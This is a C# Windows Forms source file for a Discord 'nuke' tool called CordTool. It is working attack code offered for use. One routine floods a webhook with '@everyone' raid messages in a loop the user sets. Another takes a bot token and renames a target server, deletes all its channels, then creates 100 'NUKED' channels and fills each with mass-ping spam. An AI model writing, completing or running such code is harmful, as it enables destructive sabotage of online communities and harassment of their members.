using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using DSharpPlus;

namespace CordTool
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        // ------------------ Button Event Handlers ------------------

        private async void btnSendWebhook_Click(object sender, EventArgs e)
        {
            string webhook = Prompt.ShowDialog("Enter Webhook URL:", "Webhook");
            string message = Prompt.ShowDialog("Enter Message:", "Message");

            if (!string.IsNullOrWhiteSpace(webhook) && !string.IsNullOrWhiteSpace(message))
            {
                await WebhookMessage(webhook, message);
                MessageBox.Show("Message sent!");
            }
        }

        private async void btnNukeServer_Click(object sender, EventArgs e)
        {
            string webhook = Prompt.ShowDialog("Enter Webhook URL:", "Webhook");
            string serverInvite = Prompt.ShowDialog("Server invite link:", "Invite");
            int loops;
            while (!int.TryParse(Prompt.ShowDialog("How many times to send?", "Loop Count"), out loops) || loops <= 0) { }

            await NukeServer(webhook, serverInvite, loops);
            MessageBox.Show("Nuked!");
        }

        private async void btnNukeServerBetter_Click(object sender, EventArgs e)
        {
            string token = Prompt.ShowDialog("Enter Bot Token:", "Bot Token");
            string serverNameOverride = Prompt.ShowDialog("Enter Name Override:", "Server Name");
            string guildId = Prompt.ShowDialog("Enter Server ID:", "Server ID");
            string serverInvite = Prompt.ShowDialog("Enter Discord Invite Link:", "Server Invite");

            await NukeServerBetter(token, serverNameOverride, guildId, serverInvite);
            MessageBox.Show("Better Nuke process completed!");
        }

        private void btnReleaseNotes_Click(object sender, EventArgs e)
        {
            MessageBox.Show(
                "Version 2.0.0 - GUI version integrated.\n" +
                "Other versions available in console release notes."
            );
        }

        private void btnExit_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        // ------------------ Logic Methods ------------------

        private async Task WebhookMessage(string webhook, string message)
        {
            string json = $"{{\"content\": \"{message}\"}}";
            using (HttpClient client = new HttpClient())
            {
                HttpContent content = new StringContent(json, Encoding.UTF8, "application/json");
                await client.PostAsync(webhook, content);
            }
        }

        private async Task NukeServer(string webhook, string serverInvite, int loops)
        {
            string message = $"RAIDED BY {serverInvite} @everyone";
            string json = $"{{\"content\": \"{message}\"}}";

            using (HttpClient client = new HttpClient())
            {
                for (int i = 0; i < loops; i++)
                {
                    HttpContent content = new StringContent(json, Encoding.UTF8, "application/json");
                    await client.PostAsync(webhook, content);
                }
            }
        }

        private async Task NukeServerBetter(string token, string serverNameOverride, string guildId, string serverInvite)
        {
            var discord = new DiscordClient(new DiscordConfiguration()
            {
                Token = token,
                TokenType = TokenType.Bot
            });

            await discord.ConnectAsync();

            var guild = await discord.GetGuildAsync(ulong.Parse(guildId));
            await guild.ModifyAsync(g => g.Name = serverNameOverride);

            var channels = await guild.GetChannelsAsync();
            foreach (var channel in channels)
            {
                try { await channel.DeleteAsync(); }
                catch { }
            }

            for (int j = 0; j < 100; j++)
            {
                try
                {
                    var channel = await guild.CreateTextChannelAsync($"NUKED-{j}");
                    for (int k = 0; k < 5; k++)
                        await channel.SendMessageAsync($"NUKED BY {serverInvite} @everyone");
                }
                catch { }
            }

            await discord.DisconnectAsync();
        }
    }

    // ------------------ Prompt Helper ------------------
    public static class Prompt
    {
        public static string ShowDialog(string text, string caption)
        {
            Form prompt = new Form()
            {
                Width = 500,
                Height = 150,
                FormBorderStyle = FormBorderStyle.FixedDialog,
                Text = caption,
                StartPosition = FormStartPosition.CenterScreen
            };
            Label textLabel = new Label() { Left = 50, Top = 20, Text = text, Width = 400 };
            TextBox inputBox = new TextBox() { Left = 50, Top = 50, Width = 400 };
            Button confirmation = new Button() { Text = "Ok", Left = 350, Width = 100, Top = 80, DialogResult = DialogResult.OK };
            confirmation.Click += (sender, e) => { prompt.Close(); };
            prompt.Controls.Add(textLabel);
            prompt.Controls.Add(inputBox);
            prompt.Controls.Add(confirmation);
            prompt.AcceptButton = confirmation;

            return prompt.ShowDialog() == DialogResult.OK ? inputBox.Text : "";
        }
    }
}
